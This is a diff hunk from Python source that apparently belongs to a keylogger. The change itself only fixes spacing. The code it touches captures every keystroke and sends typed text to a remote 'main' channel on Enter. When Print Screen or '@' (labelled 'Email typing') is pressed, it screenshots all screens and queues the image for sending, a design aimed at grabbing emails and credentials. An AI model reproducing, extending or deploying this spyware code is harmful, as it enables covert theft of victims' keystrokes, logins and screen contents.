@@ -10,17 +10,17 @@ def on_press(key):
     if processed_key in ctrl_codes.keys():
         processed_key = ' `' + ctrl_codes[processed_key] + '`'
     if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
-        if processed_key== Key.space:
+        if processed_key == Key.space:
             processed_key = ' '
-        elif processed_key== Key.shift:
+        elif processed_key == Key.shift:
             processed_key = ' *`SHIFT`*'
-        elif processed_key== Key.tab:
+        elif processed_key == Key.tab:
             processed_key = ' *`TAB`*'
-        elif processed_key== Key.backspace:
+        elif processed_key == Key.backspace:
             processed_key = ' *`<`*'
-        elif processed_key== Key.enter:
+        elif processed_key == Key.enter:
             processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
-        elif processed_key== Key.print_screen or processed_key== '@':
+        elif processed_key == Key.print_screen or processed_key== '@':
                 processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                 ImageGrab.grab(all_screens=True).save('ss.png')
                 embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
